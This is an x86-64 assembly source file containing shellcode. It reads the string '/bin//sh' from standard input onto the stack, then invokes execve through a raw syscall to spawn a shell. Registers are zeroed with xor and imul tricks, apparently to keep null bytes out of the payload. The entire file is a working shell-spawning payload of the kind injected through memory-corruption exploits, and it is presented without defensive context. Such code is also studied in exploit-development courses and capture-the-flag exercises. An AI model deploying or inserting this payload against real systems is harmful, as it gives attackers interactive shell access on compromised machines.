global _start

section .text

_start:

; GET '/bin//sh' from STDIN
binSH_to_buffer:

    ; read(FD, *buf, SIZE)
    xor rdi, rdi        ; 1st arg - FD - null - STDIN
    push rdi
    push rdi
    lea rsi, [rsp]      ; 2nd arg - buf - Stack

    imul rdx, rdi       ; RDX - 0   
    imul rax, rdx       ; RAX - 0 , syscall for read()
    add dl, 8           ; 3rd arg - SIZE - 8 bytes
    syscall


; POPS shell
form_execve_arg:
    
    ; execve('/bin//sh', ['/bin//sh', null], null)
    xchg rdi, rsi       ; 1st arg - /bin//sh
    sub dl, 8           ; RDX - 0

    ; [ ptr to /bin//sh | NULL | /bin//sh ] 
    push rdx            ; push null to stack
    push rdi            ; push ptr to /bin//sh to stack

    mov rsi, rsp        ; 2nd arg - ptr to /bin//sh
    imul rax, rdx       ; RAX - 0
    add al, 59          ; RAX - 59, syscall for execve()
    syscall
